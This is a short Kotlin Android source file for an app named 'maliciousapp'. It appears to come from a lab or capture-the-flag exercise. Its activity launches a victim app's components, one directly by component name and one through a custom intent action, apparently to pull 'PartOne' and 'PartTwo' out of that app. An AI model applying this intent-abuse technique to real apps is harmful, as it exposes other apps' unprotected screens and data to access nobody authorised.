package com.example.maliciousapp

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.app.Activity
import android.content.Intent
import android.content.ComponentName
import android.widget.TextView

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // // PartOne
        // val intent = Intent()
        // intent.component = ComponentName(
        //     "com.example.victimapp",
        //     "com.example.victimapp.PartOne"
        // )
        //
        // startActivity(intent)

        // PartTwo
        val sendIntent: Intent = Intent().apply {
            action = "com.example.victimapp.intent.action.JUSTASK"
            // putExtra(Intent.EXTRA_TEXT, "Send me PartTwo, please")
            // type = "text/plain"
        }
        startActivity(sendIntent)
    }
}
